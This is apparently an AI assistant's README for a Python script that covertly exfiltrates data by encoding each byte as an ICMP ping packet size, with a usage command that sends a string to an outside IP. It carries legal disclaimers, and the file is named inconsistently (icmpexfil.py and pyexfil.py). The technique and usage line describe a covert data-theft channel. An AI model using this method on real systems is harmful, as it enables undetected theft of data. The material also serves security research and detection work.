Here’s a simple README for the icmpexfil.py script:

pyexfil.py

Description

pyexfil.py is a Python script designed to covertly exfiltrate data by encoding it as ICMP packet sizes and sending them to a target IP address using the ping command. The script works by converting a given string into its byte representation and then sending a single ping for each byte, with the size of the ping corresponding to the byte value.

How It Works

	1.	The user provides a target IP address and the data they want to exfiltrate.
	2.	The script encodes the data into bytes.
	3.	It sends ICMP echo requests (ping) to the target IP with the byte values as the packet size.

Note: This script is intended for educational purposes only. Unauthorized use of this script to exfiltrate data without permission is illegal.

Requirements

	•	Python 3.x
	•	ICMP ping capabilities on the system
	•	Administrative privileges (may be required for ICMP operations depending on your environment)

Usage

python pyexfil.py <IP> <data>

Arguments:

	•	<IP>: The target IP address to send the pings to.
	•	<data>: The data string to be encoded and sent via ICMP packets.

Example:

python pyexfil.py 192.168.1.100 "HelloWorld"

This will send pings to 192.168.1.100, with each byte of the string HelloWorld converted to its ASCII byte value and sent as the packet size.

How to Install

	1.	Clone the repository or download the pyexfil.py file.
	2.	Ensure Python 3.x is installed on your system.
	3.	Run the script as shown in the usage example.

Limitations

	•	This script sends ICMP packets with sizes corresponding to ASCII values. Some systems may filter or limit ping packet sizes.
	•	The script is intended for educational and security research purposes only. Unauthorized use can lead to legal consequences.

Legal Disclaimer

This script is provided for educational purposes only. The author is not responsible for any misuse or damage caused by this script. Use responsibly and ensure you have explicit permission before running this script against any system.

License

This project is licensed under the MIT License. See the LICENSE file for details.

Let me know if you need any adjustments or additional details!
